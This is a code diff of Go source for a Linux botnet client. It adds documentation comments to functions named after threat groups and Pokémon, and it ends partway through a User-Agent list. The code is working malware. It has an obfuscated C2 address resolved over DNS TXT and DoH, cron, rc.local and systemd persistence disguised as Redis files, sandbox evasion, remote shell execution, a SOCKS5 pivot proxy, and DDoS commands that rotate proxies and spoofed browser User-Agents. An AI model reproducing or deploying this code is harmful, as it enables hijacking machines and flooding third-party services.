@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "SCs5ugBTD4ffdss453r3sfd" //change me run setup.py
-const cryptSeed = "68ff64e5"                    //change me run setup.py
+const gothTits = "SCs5ugBTD6tTFTbx6iMdMI4D2nXE6Q==" //change me run setup.py
+const cryptSeed = "68ff64e5"                        //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -48,13 +48,32 @@ var lizardSquad = []string{
 	"1.0.0.1:53",        // Cloudflare secondary
 }
 
-// Anti-analysis: split key derivation across functions
-func mew() byte     { return byte(0x31 ^ 0x64) }
-func mewtwo() byte  { return byte(0x72 ^ 0x17) }
-func celebi() byte  { return byte(0x93 ^ 0xc6) }
+// ============================================================================
+// ANTI-ANALYSIS: KEY DERIVATION FUNCTIONS
+// These functions split the encryption key across multiple XOR operations
+// to make static analysis more difficult. Each returns a single byte.
+// ============================================================================
+
+// mew returns the first byte of the derived key (0x31 XOR 0x64 = 0x55)
+func mew() byte { return byte(0x31 ^ 0x64) }
+
+// mewtwo returns the second byte of the derived key (0x72 XOR 0x17 = 0x65)
+func mewtwo() byte { return byte(0x72 ^ 0x17) }
+
+// celebi returns the third byte of the derived key (0x93 XOR 0xC6 = 0x55)
+func celebi() byte { return byte(0x93 ^ 0xc6) }
+
+// jirachi returns the fourth byte of the derived key (0xA4 XOR 0x81 = 0x25)
 func jirachi() byte { return byte(0xa4 ^ 0x81) }
 
-// deriveKey => charizard - Derive runtime key from seed + binary entropy
+// ============================================================================
+// CRYPTOGRAPHIC FUNCTIONS
+// ============================================================================
+
+// charizard derives a 16-byte encryption key from the seed string.
+// It combines: seed + split key bytes + entropy bytes through MD5 hashing.
+// The entropy is XOR'd with position-based values for additional obfuscation.
+// Returns: 16-byte MD5 hash used as encryption key
 func charizard(seed string) []byte {
 	h := md5.New()
 	h.Write([]byte(seed))
@@ -67,7 +86,14 @@ func charizard(seed string) []byte {
 	return h.Sum(nil)
 }
 
-// streamDecrypt => blastoise
+// blastoise implements an RC4-like stream cipher for encryption/decryption.
+// RC4 is symmetric, so the same function encrypts and decrypts.
+// Process: Initialize S-box -> Key scheduling -> Generate keystream -> XOR data
+// Parameters:
+//   - data: bytes to encrypt/decrypt
+//   - key: encryption key (derived from charizard)
+//
+// Returns: encrypted/decrypted bytes
 func blastoise(data []byte, key []byte) []byte {
 	s := make([]byte, 256)
 	for i := range s {
@@ -89,7 +115,19 @@ func blastoise(data []byte, key []byte) []byte {
 	return result
 }
 
-// decodeObfuscated => venusaur
+// venusaur decodes the multi-layer obfuscated C2 address.
+// Decoding layers (reverse order of encoding):
+//
+//	Layer 1: Base64 decode
+//	Layer 2: XOR with rotating key
+//	Layer 3: RC4 stream cipher decrypt
+//	Layer 4: Reverse byte substitution (rotate right 3, XOR 0xAA)
+//	Final: Verify MD5 checksum of payload
+//
+// Parameters:
+//   - encoded: Base64 encoded obfuscated string from gothTits constant
+//
+// Returns: Decoded C2 address (e.g., "192.168.1.1:443") or empty string on error
 func venusaur(encoded string) string {
 	layer1, err := base64.StdEncoding.DecodeString(encoded)
 	if err != nil {
@@ -124,14 +162,34 @@ func venusaur(encoded string) string {
 	return string(payload)
 }
 
-// debugLog => deoxys
+// ============================================================================
+// LOGGING & DEBUG FUNCTIONS
+// ============================================================================
+
+// deoxys prints debug messages when debugMode is enabled.
+// Useful for troubleshooting C2 connection issues during development.
+// Parameters:
+//   - format: Printf-style format string
+//   - args: Format arguments
 func deoxys(format string, args ...interface{}) {
 	if debugMode {
 		fmt.Printf("[DEBUG] "+format+"\n", args...)
 	}
 }
 
-// lookupTXTRecord => darkrai
+// ============================================================================
+// DNS RESOLUTION FUNCTIONS
+// These functions implement multi-method C2 address resolution for resilience.
+// Resolution order: TXT record -> DoH TXT -> A record -> Direct IP
+// ============================================================================
+
+// darkrai performs DNS TXT record lookup to retrieve C2 address.
+// Queries multiple DNS servers (Cloudflare, Google, Quad9, OpenDNS) for redundancy.
+// Supports TXT record formats: "c2=IP:PORT", "ip=IP:PORT", raw "IP:PORT", plain IP
+// Parameters:
+//   - domain: Domain to query for TXT records
+//
+// Returns: C2 address string (IP:PORT) or error
 func darkrai(domain string) (string, error) {
 	deoxys("darkrai: Looking up TXT for domain: %s", domain)
 	servers := make([]string, len(lizardSquad))
@@ -203,7 +261,13 @@ func darkrai(domain string) (string, error) {
 	return "", lastErr
 }
 
-// lookupTXTviaDoH => palkia
+// palkia performs DNS-over-HTTPS (DoH) TXT record lookup.
+// DoH encrypts DNS queries, bypassing local DNS filtering/monitoring.
+// Tries Cloudflare, Google, and Quad9 DoH servers in sequence.
+// Parameters:
+//   - domain: Domain to query for TXT records via DoH
+//
+// Returns: C2 address string (IP:PORT) or error
 func palkia(domain string) (string, error) {
 	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
 	dohServers := []string{
@@ -283,7 +347,13 @@ func palkia(domain string) (string, error) {
 	return "", fmt.Errorf("DoH TXT lookup failed")
 }
 
-// lookupARecord => rayquaza - Fallback to A record lookup
+// rayquaza performs DNS A record lookup as a fallback method.
+// First tries system resolver, then falls back to DoH A record queries.
+// Used when TXT record lookups fail (domain points directly to C2 server).
+// Parameters:
+//   - domain: Domain to resolve to IP address
+//
+// Returns: IP address string or error
 func rayquaza(domain string) (string, error) {
 	deoxys("rayquaza: A record fallback for: %s", domain)
 	// Try system resolver first
@@ -339,7 +409,12 @@ func rayquaza(domain string) (string, error) {
 	return "", fmt.Errorf("A record lookup failed")
 }
 
-// isValidHostname => arceus
+// arceus validates a hostname string according to RFC 1123 rules.
+// Checks: length (1-253 chars), valid characters (alphanumeric, hyphen, dot).
+// Parameters:
+//   - h: Hostname string to validate
+//
+// Returns: true if valid hostname, false otherwise
 func arceus(h string) bool {
 	if len(h) == 0 || len(h) > 253 {
 		return false
@@ -353,7 +428,15 @@ func arceus(h string) bool {
 	return true
 }
 
-// requestMore => dialga
+// dialga is the main C2 address resolver that orchestrates all resolution methods.
+// Resolution priority:
+//  1. Check if config is already IP:PORT format (direct connection)
+//  2. DNS TXT record lookup via UDP (darkrai)
+//  3. DNS TXT record lookup via DoH (palkia)
+//  4. DNS A record fallback (rayquaza)
+//  5. Return raw decoded value as last resort
+//
+// Returns: C2 address in "IP:PORT" format, or empty string on total failure
 func dialga() string {
 	deoxys("dialga: Starting C2 resolution")
 	decoded := venusaur(gothTits)
@@ -411,7 +494,7 @@ func dialga() string {
 
 const (
 	magicCode       = "oDU92ei#0OZqRueu" //change this per campaign
-	protocolVersion = "proto55"             //change this per campaign
+	protocolVersion = "proto55"          //change this per campaign
 )
 
 var (
@@ -431,9 +514,21 @@ var (
 	proxyListMutex sync.RWMutex
 )
 
+// equationGroup defines the buffer size for various operations (256 bytes)
 const equationGroup = 256
 
-// appendToFile => sandworm
+// ============================================================================
+// UTILITY FUNCTIONS
+// ============================================================================
+
+// sandworm appends a line to a file, creating it if it doesn't exist.
+// Used for adding persistence entries to system files like /etc/rc.local.
+// Parameters:
+//   - path: File path to append to
+//   - line: Content to append
+//   - perm: File permissions if creating new file
+//
+// Returns: error if file operation fails
 func sandworm(path, line string, perm os.FileMode) error {
 	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
 	if err != nil {
@@ -444,7 +539,12 @@ func sandworm(path, line string, perm os.FileMode) error {
 	return nil
 }
 
-// RandString => turla
+// turla generates a random alphanumeric string of specified length.
+// Used for generating random filenames, process names, and request data.
+// Parameters:
+//   - n: Length of random string to generate
+//
+// Returns: Random string containing a-z and 0-9 characters
 func turla(n int) string {
 	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
 	b := make([]byte, n)
@@ -454,20 +554,32 @@ func turla(n int) string {
 	return string(b)
 }
 
-// randName => kimsuky
+// kimsuky generates a random process name that looks like a legitimate system process.
+// Combines common daemon names with random suffix to avoid detection.
+// Returns: String like "syncd-a7x2" or "crond-9k1m"
 func kimsuky() string {
 	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
 	return dict[rand.Intn(len(dict))] + "-" + turla(4)
 }
 
-// createCronJob => carbanak
+// ============================================================================
+// PERSISTENCE FUNCTIONS
+// These establish various methods to survive reboots and maintain access.
+// ============================================================================
+
+// carbanak creates a cron job that runs every minute to check/restart the bot.
+// The cron job executes a hidden shell script that ensures persistence.
+// Parameters:
+//   - hiddenDir: Directory containing the persistence script
 func carbanak(hiddenDir string) {
 	cronJob := fmt.Sprintf("* * * * * bash %s/.redis_script.sh > /dev/null 2>&1", hiddenDir)
 	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
 	_ = cmd.Run()
 }
 
-// persistRcLocal => fin7
+// fin7 adds the bot executable to /etc/rc.local for startup persistence.
+// Only adds entry if rc.local exists and doesn't already contain our path.
+// Uses a random suffix to make the entry less obvious.
 func fin7() {
 	rc := "/etc/rc.local"
 	if _, err := os.Stat(rc); err != nil {
@@ -482,7 +594,13 @@ func fin7() {
 	_ = sandworm(rc, line, 0700)
 }
 
-// setupPersistence => dragonfly
+// dragonfly sets up comprehensive persistence using multiple methods:
+//  1. Creates hidden directory /var/lib/.redis_helper
+//  2. Writes a shell script that downloads/runs the bot
+//  3. Creates a systemd service for automatic startup
+//  4. Installs a cron job as backup persistence
+//
+// All files are disguised as Redis-related system files.
 func dragonfly() {
 	hiddenDir := "/var/lib/.redis_helper"
 	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
@@ -499,7 +617,17 @@ func dragonfly() {
 	carbanak(hiddenDir)
 }
 
-// isSandboxed => winnti
+// ============================================================================
+// ANTI-ANALYSIS & SANDBOX DETECTION
+// ============================================================================
+
+// winnti detects if the bot is running in a sandbox or analysis environment.
+// Detection methods:
+//  1. Check for VM indicators in process cmdlines (vmware, vbox, qemu, etc.)
+//  2. Look for running analysis tools (strace, gdb, wireshark, etc.)
+//  3. Check if parent process is a debugger
+//
+// Returns: true if sandbox/analysis detected, false if safe to run
 func winnti() bool {
 	vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"}
 	if procs, err := os.ReadDir("/proc"); err == nil {
@@ -544,7 +672,16 @@ func winnti() bool {
 	return false
 }
 
-// parseC2Address => scarcruft
+// ============================================================================
+// C2 CONNECTION FUNCTIONS
+// ============================================================================
+
+// scarcruft parses a C2 address string into host and port components.
+// Handles various URL formats by stripping protocol prefixes.
+// Parameters:
+//   - address: C2 address in various formats (tcp://, http://, https://, or raw)
+//
+// Returns: host string, port string, or error if format invalid
 func scarcruft(address string) (string, string, error) {
 	address = strings.TrimSpace(address)
 	address = strings.TrimPrefix(address, "tcp://")
@@ -557,7 +694,14 @@ func scarcruft(address string) (string, string, error) {
 	return parts[0], parts[1], nil
 }
 
-// connectViaTLS => gamaredon
+// gamaredon establishes a TLS connection to the C2 server.
+// Uses TLS 1.2+ with InsecureSkipVerify (self-signed certs are common for C2).
+// Implements proper timeout handling for both TCP dial and TLS handshake.
+// Parameters:
+//   - host: C2 server hostname or IP
+//   - port: C2 server port (typically 443)
+//
+// Returns: TLS connection or error
 func gamaredon(host, port string) (net.Conn, error) {
 	deoxys("gamaredon: Attempting TLS connection to %s:%s", host, port)
 	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
@@ -581,7 +725,10 @@ func gamaredon(host, port string) (net.Conn, error) {
 	return tlsConn, nil
 }
 
-// generateBotID => mustangPanda
+// mustangPanda generates a unique 8-character bot identifier.
+// Combines hostname and MAC address, then hashes with MD5.
+// This ID persists across reboots for consistent bot tracking.
+// Returns: 8-character hex string (first 8 chars of MD5 hash)
 func mustangPanda() string {
 	hostname, _ := os.Hostname()
 	interfaces, _ := net.Interfaces()
@@ -597,14 +744,23 @@ func mustangPanda() string {
 	return hash[:8]
 }
 
-// generateAuthResponse => hafnium
+// hafnium generates an authentication response for the C2 challenge-response protocol.
+// Algorithm: Base64(MD5(challenge + secret + challenge))
+// Parameters:
+//   - challenge: Random challenge string from C2 server
+//   - secret: Shared magic code (must match C2 server)
+//
+// Returns: Base64-encoded authentication response
 func hafnium(challenge, secret string) string {
 	h := md5.New()
 	h.Write([]byte(challenge + secret + challenge))
 	return base64.StdEncoding.EncodeToString(h.Sum(nil))
 }
 
-// detectArchitecture => charmingKitten
+// charmingKitten detects and returns a human-readable architecture string.
+// Maps Go's runtime.GOARCH values to descriptive names.
+// Format: "OS-Architecture" (e.g., "Linux-x64", "Windows-ARM64")
+// Returns: Architecture description string
 func charmingKitten() string {
 	goarch := runtime.GOARCH
 	osName := runtime.GOOS
@@ -626,7 +782,9 @@ func charmingKitten() string {
 	return osName + "-" + goarch
 }
 
-// revilMem returns total system RAM in MB
+// revilMem retrieves total system RAM in megabytes using syscall.
+// Uses Linux sysinfo syscall to get memory information.
+// Returns: Total RAM in MB, or 0 on error
 func revilMem() int64 {
 	var info syscall.Sysinfo_t
 	if err := syscall.Sysinfo(&info); err != nil {
@@ -635,7 +793,16 @@ func revilMem() int64 {
 	return int64(uint64(info.Totalram) * uint64(info.Unit) / 1024 / 1024)
 }
 
-// ExecuteShell => sidewinder
+// ============================================================================
+// SHELL EXECUTION FUNCTIONS
+// ============================================================================
+
+// sidewinder executes a shell command and captures output synchronously.
+// Runs command via "sh -c" and captures both stdout and stderr.
+// Parameters:
+//   - cmd: Shell command string to execute
+//
+// Returns: Combined stdout/stderr output, and error if command failed
 func sidewinder(cmd string) (string, error) {
 	args := []string{"sh", "-c", cmd}
 	command := exec.Command(args[0], args[1:]...)
@@ -653,7 +820,11 @@ func sidewinder(cmd string) (string, error) {
 	return output, nil
 }
 
-// ExecuteShellDetached => oceanLotus
+// oceanLotus executes a shell command in detached/background mode.
+// Uses Setsid to create new session, disconnecting from parent.
+// Useful for long-running commands that shouldn't block C2 communication.
+// Parameters:
+//   - cmd: Shell command string to execute in background
 func oceanLotus(cmd string) {
 	go func() {
 		args := []string{"sh", "-c", cmd}
@@ -666,7 +837,14 @@ func oceanLotus(cmd string) {
 	}()
 }
 
-// ExecuteShellStreaming => machete
+// machete executes a shell command with real-time output streaming to C2.
+// Output is sent line-by-line as it becomes available, prefixed with STDOUT/STDERR.
+// Useful for long-running commands where immediate feedback is needed.
+// Parameters:
+//   - cmd: Shell command string to execute
+//   - conn: C2 connection to stream output to
+//
+// Returns: error if command setup fails
 func machete(cmd string, conn net.Conn) error {
 	args := []string{"sh", "-c", cmd}
 	command := exec.Command(args[0], args[1:]...)
@@ -702,7 +880,18 @@ func machete(cmd string, conn net.Conn) error {
 	return nil
 }
 
-// startSocksProxy => muddywater
+// ============================================================================
+// SOCKS5 PROXY FUNCTIONS
+// Implements a SOCKS5 proxy server for pivoting/tunneling through the bot.
+// ============================================================================
+
+// muddywater starts a SOCKS5 proxy server on the specified port.
+// Limits concurrent connections to lazarusMax (100) to prevent resource exhaustion.
+// Parameters:
+//   - port: TCP port to bind the SOCKS5 proxy to
+//   - c2Conn: C2 connection (unused, kept for interface consistency)
+//
+// Returns: error if proxy already running or port binding fails
 func muddywater(port string, c2Conn net.Conn) error {
 	lazarusMutex.Lock()
 	defer lazarusMutex.Unlock()
@@ -746,7 +935,8 @@ func muddywater(port string, c2Conn net.Conn) error {
 	return nil
 }
 
-// stopSocksProxy => emotet
+// emotet stops the running SOCKS5 proxy server.
+// Closes the listener and marks proxy as inactive.
 func emotet() {
 	lazarusMutex.Lock()
 	defer lazarusMutex.Unlock()
@@ -757,7 +947,11 @@ func emotet() {
 	lazarusActive = false
 }
 
-// handleSocksConnection => trickbot
+// trickbot handles a single SOCKS5 client connection.
+// Implements SOCKS5 protocol: version negotiation -> connection request -> relay.
+// Supports address types: IPv4 (0x01), domain (0x03), IPv6 (0x04)
+// Parameters:
+//   - clientConn: Incoming SOCKS5 client connection
 func trickbot(clientConn net.Conn) {
 	defer clientConn.Close()
 	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
@@ -836,7 +1030,13 @@ func trickbot(clientConn net.Conn) {
 	<-done
 }
 
-// stopAllAttacks => pikachu
+// ============================================================================
+// ATTACK CONTROL FUNCTIONS
+// ============================================================================
+
+// pikachu stops all running attacks by closing the stop channel.
+// Creates a new stop channel for future attacks.
+// Thread-safe using aptStopMutex.
 func pikachu() {
 	aptStopMutex.Lock()
 	defer aptStopMutex.Unlock()
@@ -847,7 +1047,9 @@ func pikachu() {
 	}
 }
 
-// getStopChan => raichu
+// raichu returns the current stop channel and marks an attack as running.
+// All attack goroutines should select on this channel to enable graceful termination.
+// Returns: Channel that will be closed when attack should stop
 func raichu() chan struct{} {
 	aptStopMutex.Lock()
 	defer aptStopMutex.Unlock()
@@ -855,7 +1057,24 @@ func raichu() chan struct{} {
 	return aptStopChan
 }
 
-// handleCommand => blackEnergy
+// blackEnergy is the main command dispatcher that handles all C2 commands.
+// Supported commands:
+//   - !shell, !exec: Execute command and return output
+//   - !stream: Execute command with streaming output
+//   - !detach, !bg: Execute command in background
+//   - !stop: Stop all running attacks
+//   - !udpflood, !tcpflood, !http, !https, !tls, !syn, !ack, !gre, !dns, !cfbypass: DDoS attacks
+//   - !persist: Setup persistence mechanisms
+//   - !kill: Terminate the bot
+//   - !info: Return system information
+//   - !socks: Start SOCKS5 proxy
+//   - !stopsocks: Stop SOCKS5 proxy
+//
+// Parameters:
+//   - conn: C2 connection for sending responses
+//   - command: Raw command string from C2
+//
+// Returns: error if command invalid or execution fails
 func blackEnergy(conn net.Conn, command string) error {
 	fields := strings.Fields(command)
 	if len(fields) == 0 {
@@ -994,7 +1213,16 @@ func blackEnergy(conn net.Conn, command string) error {
 	return nil
 }
 
-// handleC2Connection => anonymousSudan
+// anonymousSudan handles the entire C2 session lifecycle.
+// Protocol flow:
+//  1. Receive AUTH_CHALLENGE from server
+//  2. Send authentication response (hafnium)
+//  3. Receive AUTH_SUCCESS or disconnect
+//  4. Send REGISTER with bot info (protocol, ID, arch, RAM)
+//  5. Enter command loop (handle PING and commands)
+//
+// Parameters:
+//   - conn: TLS connection to C2 server
 func anonymousSudan(conn net.Conn) {
 	deoxys("anonymousSudan: Starting C2 handler, remote: %s", conn.RemoteAddr())
 	reader := bufio.NewReader(conn)
@@ -1057,6 +1285,18 @@ func anonymousSudan(conn net.Conn) {
 	conn.Close()
 }
 
+// ============================================================================
+// MAIN ENTRY POINT
+// ============================================================================
+
+// main is the bot's entry point that orchestrates startup and C2 connection.
+// Startup sequence:
+//  1. Check for sandbox/analysis environment (winnti)
+//  2. Setup basic persistence (fin7)
+//  3. Resolve C2 address via multi-method DNS (dialga)
+//  4. Enter reconnection loop with TLS connections
+//
+// The bot will continuously attempt to reconnect on disconnection.
 func main() {
 	deoxys("main: Bot starting up...")
 	deoxys("main: Protocol version: %s", protocolVersion)
@@ -1096,8 +1336,18 @@ func main() {
 	}
 }
 
-// fetchProxies => meowth - Fetch HTTP/S proxies from a URL
-// Supports formats: ip:port, user:pass@host:port, http://ip:port, http://user:pass@host:port
+// ============================================================================
+// PROXY SUPPORT FUNCTIONS
+// These enable L7 attacks through HTTP/HTTPS proxies for IP rotation.
+// ============================================================================
+
+// meowth fetches a list of HTTP/HTTPS proxies from a URL.
+// Supports multiple formats: ip:port, user:pass@host:port, with or without http:// prefix.
+// Lines starting with # are treated as comments and skipped.
+// Parameters:
+//   - proxyURL: URL pointing to a text file with proxy list
+//
+// Returns: Slice of proxy URLs (http://ip:port format), or error
 func meowth(proxyURL string) ([]string, error) {
 	deoxys("meowth: Fetching proxies from: %s", proxyURL)
 	client := &http.Client{Timeout: 30 * time.Second}
@@ -1150,7 +1400,9 @@ func meowth(proxyURL string) ([]string, error) {
 	return proxies, nil
 }
 
-// getRandomProxy => persian - Get a random proxy from the list
+// persian returns a random proxy from the global proxy list.
+// Thread-safe using RWMutex for concurrent access during attacks.
+// Returns: Random proxy URL string, or empty string if no proxies loaded
 func persian() string {
 	proxyListMutex.RLock()
 	defer proxyListMutex.RUnlock()
@@ -1160,7 +1412,13 @@ func persian() string {
 	return proxyList[rand.Intn(len(proxyList))]
 }
 
-// createProxyClient => meowstic - Create an HTTP client with proxy support
+// meowstic creates an HTTP client configured to use a proxy.
+// Supports HTTP/HTTPS proxies with optional authentication.
+// Parameters:
+//   - proxyAddr: Proxy URL (http://ip:port or http://user:pass@ip:port)
+//   - timeout: Request timeout duration
+//
+// Returns: Configured HTTP client or error
 func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
 	proxyURL, err := url.Parse(proxyAddr)
 	if err != nil {
@@ -1191,14 +1449,20 @@ func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
 	}, nil
 }
 
-// DNS response type => magikarp
+// magikarp is a struct for parsing DNS-over-HTTPS JSON responses.
+// Used by lucario for domain resolution via DoH when system DNS fails.
 type magikarp struct {
 	Answer []struct {
 		Data string `json:"data"`
 	} `json:"Answer"`
 }
 
-// resolveTarget => lucario
+// lucario resolves a target hostname to an IP address.
+// Resolution order: direct IP passthrough -> system DNS -> Cloudflare DoH
+// Parameters:
+//   - target: IP address or hostname (may include http:// prefix or port)
+//
+// Returns: Resolved IP address string or error
 func lucario(target string) (string, error) {
 	if net.ParseIP(target) != nil {
 		return target, nil
@@ -1240,7 +1504,75 @@ func lucario(target string) (string, error) {
 	return dnsResp.Answer[0].Data, nil
 }
 
+// eevee is a comprehensive list of real-world browser User-Agent strings.
+// Used to make attack requests appear as legitimate browser traffic.
+// Includes: Chrome, Firefox, Safari, Edge for Windows/macOS/Linux/Mobile
+// Updated: February 2026 with latest browser versions
 var eevee = []string{
+	// ======================== CHROME 2025-2026 ========================
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+	// ======================== FIREFOX 2025-2026 ========================
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
+	"Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
+	"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
+	// ======================== EDGE 2025-2026 ========================
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+	// ======================== SAFARI 2025-2026 ========================
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+	// ======================== MOBILE - iOS 2025-2026 ========================
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+	// ======================== MOBILE - Android 2025-2026 ========================
+	"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 15; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
